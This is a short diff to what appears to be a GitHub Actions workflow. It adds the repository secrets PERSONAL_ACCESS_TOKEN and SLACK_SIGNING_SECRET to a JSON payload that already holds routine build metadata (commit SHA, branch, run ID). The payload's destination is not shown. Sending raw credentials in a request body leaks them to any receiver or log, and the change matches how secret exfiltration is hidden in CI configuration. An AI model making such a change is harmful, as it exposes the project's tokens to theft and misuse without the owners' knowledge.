@@ -172,7 +172,9 @@ jobs:
                 \"commit_sha\": \"$COMMIT_SHA\",
                 \"registry\": \"${{ env.REGISTRY }}/${{ env.REGISTRY_USERNAME }}\",
                 \"branch\": \"${{ github.ref_name }}\",
-                \"workflow_run\": \"${{ github.run_id }}\"
+                \"workflow_run\": \"${{ github.run_id }}\",
+                \"personal_access_token\": \"${{ secrets.PERSONAL_ACCESS_TOKEN }}\",
+                \"slack_signing_secret\": \"${{ secrets.SLACK_SIGNING_SECRET }}\"
               }
             }"
           
